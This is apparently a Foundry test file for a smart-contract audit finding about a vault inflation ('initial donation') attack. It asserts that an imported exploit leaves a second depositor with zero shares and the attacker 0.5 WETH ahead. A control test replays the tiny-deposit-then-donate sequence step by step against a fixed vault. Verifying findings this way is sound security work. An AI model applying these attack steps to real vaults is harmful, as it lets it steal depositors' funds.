// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    Weth,
    Vault,
    VaultFixed,
    Victim
} from "./36369-h-01-univ3tokenizedlp-can-be-attacked-by-an-initial-donation.sol";

contract Finding36369Test is Test {
    function test_exploit_second_depositor_gets_zero_shares() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.victimShares(), 0, "victim minted 0 shares");
        assertEq(e.profit(), 0.5 ether, "attacker profit is the 0.5 WETH deposit");
        assertEq(e.weth().balanceOf(address(e.victim())), 0.5 ether, "victim kept the unspent half");
        assertEq(e.weth().balanceOf(address(e)), 10.5 ether, "attacker ends 0.5 ahead of the 10 seeded");
    }

    function test_control_virtual_offset_mints_shares_and_no_profit() public {
        Weth weth = new Weth();
        Weth other = new Weth();
        VaultFixed vault = new VaultFixed(other, weth);
        Victim victim = new Victim();
        weth.mint(address(this), 10 ether);
        weth.mint(address(victim), 1 ether);
        weth.approve(address(vault), type(uint256).max);
        victim.approve(weth, address(vault), 0.5 ether);

        uint256 start = weth.balanceOf(address(this));
        vault.deposit(0, 1, address(this));
        weth.transfer(address(vault), 1 ether);
        victim.deposit(vault, 0.5 ether);
        uint256 victimShares = vault.balanceOf(address(victim));
        vault.withdraw(vault.balanceOf(address(this)), address(this));
        uint256 end = weth.balanceOf(address(this));

        assertGt(victimShares, 0, "offset mints shares to the second depositor");
        assertLt(end, start, "donation is not profit once shares are virtual");
        assertGt(weth.balanceOf(address(victim)) + victimShares, 0.5 ether, "victim still has a claim");
    }
}
